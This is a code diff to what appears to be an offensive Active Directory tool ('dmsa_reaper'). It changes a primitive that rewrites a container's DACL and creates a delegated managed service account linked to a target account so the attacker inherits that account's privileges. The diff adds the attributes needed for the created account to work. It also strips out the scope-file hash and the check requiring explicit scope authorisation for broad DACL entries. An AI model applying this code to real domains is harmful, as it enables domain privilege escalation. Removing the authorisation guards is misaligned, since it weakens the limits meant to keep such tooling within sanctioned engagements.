@@ -16,7 +16,9 @@ from dmsa_reaper.primitives._ldap_helpers import (
     DMSA_MANAGED_PASSWORD_INTERVAL,
     DMSA_OBJECT_CLASSES,
     DMSA_STATE_COMPLETED,
+    DMSA_SUPPORTED_ENCRYPTION_TYPES,
     DMSA_UAC,
+    build_dmsa_creation_attributes,
     dmsa_dn,
     generate_dmsa_name,
     journal_created_object,
@@ -28,8 +30,6 @@ from dmsa_reaper.utils import guid_to_bytes_le
 
 if TYPE_CHECKING:
     from ldap3 import Connection
-
-    from dmsa_reaper.scope import Scope
 
 _STATE_ACTIVE = 2
 
@@ -64,38 +64,27 @@ class DaclContainerEscalatePrimitive(Primitive):
     def check(self, path: PathCandidate) -> bool:
         return path.primitive == self.name and path.requires_modify_container_dacl
 
-    def plan(self, path: PathCandidate, *, scope_file_hash: str | None = None) -> Operation:
+    def plan(self, path: PathCandidate) -> Operation:
         return new_operation(
             primitive=self.name,
             path_id=path.id,
             metadata={"path": path.model_dump()},
-            scope_file_hash=scope_file_hash,
         )
 
     def preflight(
         self,
         path: PathCandidate,
         *,
-        scope: "Scope | None" = None,
         target_dn: str | None = None,
         container_dn: str | None = None,
     ) -> list[str]:
-        warnings = super().preflight(path, scope=scope, target_dn=target_dn, container_dn=container_dn)
+        warnings = super().preflight(path, target_dn=target_dn, container_dn=container_dn)
         if not (path.target_dn or target_dn):
             raise PrimitiveError(
                 "dacl-container-escalate requires --target-dn "
                 "(the account whose PAC should be inherited)."
             )
         return warnings
-
-    def _planned_modified_dns(self, path: PathCandidate, *, target_dn: str | None = None) -> list[str]:
-        dns = []
-        if path.container_dn:
-            dns.append(path.container_dn)
-        effective_target = target_dn or path.target_dn
-        if effective_target:
-            dns.append(effective_target)
-        return dns
 
     def execute(
         self,
@@ -113,15 +102,12 @@ class DaclContainerEscalatePrimitive(Primitive):
         container_dn = resolve_meta(meta, "container_dn")
         target_dn = resolve_meta(meta, "target_dn")
         principal_sid = resolve_meta(meta, "principal_sid")
+        domain = resolve_meta(meta, "domain")
         allow_broad = bool(meta.get("allow_broad_dacl"))
         chain = meta.get("chain")
         if chain not in {"postpatch", "legacy"}:
             raise PrimitiveError("operation metadata must select the postpatch or legacy chain")
 
-        if allow_broad and not meta.get("scope_allow_broad_dacl"):
-            raise PrimitiveError(
-                "broad DACL ACEs require allowBroadDacl=true in scope and --allow-broad-dacl"
-            )
         if not container_dn:
             raise PrimitiveError("container_dn is required in operation metadata")
         if not target_dn:
@@ -130,6 +116,22 @@ class DaclContainerEscalatePrimitive(Primitive):
             raise PrimitiveError(
                 "principal_sid is required in operation metadata for DACL ACE construction"
             )
+        if not domain:
+            raise PrimitiveError("domain is required to construct the dMSA DNS hostname")
+
+        # Resolve and validate the complete dMSA add before changing any DACL.
+        cn = generate_dmsa_name(meta.get("dmsa_name"))
+        new_dn = dmsa_dn(cn, container_dn)
+        sam = f"{cn}$"
+        try:
+            creation_attrs = build_dmsa_creation_attributes(
+                cn=cn,
+                domain=domain,
+                principal_sid=principal_sid,
+                target_dn=target_dn,
+            )
+        except ValueError as exc:
+            raise PrimitiveError(str(exc)) from exc
 
         # ── Postpatch pre-check (before any LDAP write) ────────────────────────
         if chain == "postpatch":
@@ -195,10 +197,6 @@ class DaclContainerEscalatePrimitive(Primitive):
         save_operation(operation)
 
         # ── Phase 3: create dMSA in the container ─────────────────────────────
-        cn = generate_dmsa_name(meta.get("dmsa_name"))
-        new_dn = dmsa_dn(cn, container_dn)
-        sam = f"{cn}$"
-
         operation.maybe_created_dns.append(new_dn)
         operation.metadata["created_dmsa_dn"] = new_dn
         operation.metadata["created_dmsa_sam"] = sam
@@ -209,13 +207,7 @@ class DaclContainerEscalatePrimitive(Primitive):
                 conn,
                 new_dn,
                 DMSA_OBJECT_CLASSES,
-                {
-                    "sAMAccountName": sam,
-                    "userAccountControl": DMSA_UAC,
-                    "msDS-ManagedPasswordInterval": DMSA_MANAGED_PASSWORD_INTERVAL,
-                    "msDS-DelegatedMSAState": DMSA_STATE_COMPLETED,
-                    "msDS-ManagedAccountPrecededByLink": target_dn,
-                },
+                creation_attrs,
             )
             journal_created_object(operation, conn, new_dn)
         except Exception as exc:
@@ -288,6 +280,7 @@ class DaclContainerEscalatePrimitive(Primitive):
         container_dn = resolve_meta(meta, "container_dn") or "<container_dn>"
         target_dn = resolve_meta(meta, "target_dn") or "<target_dn>"
         principal_sid = resolve_meta(meta, "principal_sid") or "<principal_sid>"
+        domain = resolve_meta(meta, "domain") or "<domain>"
         allow_broad = bool(meta.get("allow_broad_dacl"))
         chain = meta.get("chain")
         dmsa_class_guid = resolve_meta(meta, "dmsa_class_guid") or "(not in schema cache)"
@@ -319,8 +312,13 @@ class DaclContainerEscalatePrimitive(Primitive):
             f"PHASE 3  CREATE  {new_dn}",
             f"  object classes                         : {', '.join(DMSA_OBJECT_CLASSES)}",
             f"  sAMAccountName                         : {sam}",
+            f"  dNSHostName                            : {cn.lower()}.{domain}",
+            f"  userAccountControl                     : {DMSA_UAC}",
+            f"  msDS-ManagedPasswordInterval           : {DMSA_MANAGED_PASSWORD_INTERVAL}",
+            f"  msDS-GroupMSAMembership                : authorize {principal_sid}",
             f"  msDS-DelegatedMSAState                 : {DMSA_STATE_COMPLETED}  (migration-completed)",
             f"  msDS-ManagedAccountPrecededByLink       : {target_dn}",
+            f"  msDS-SupportedEncryptionTypes          : 0x{DMSA_SUPPORTED_ENCRYPTION_TYPES:02x}",
         ]
 
         if chain == "postpatch":
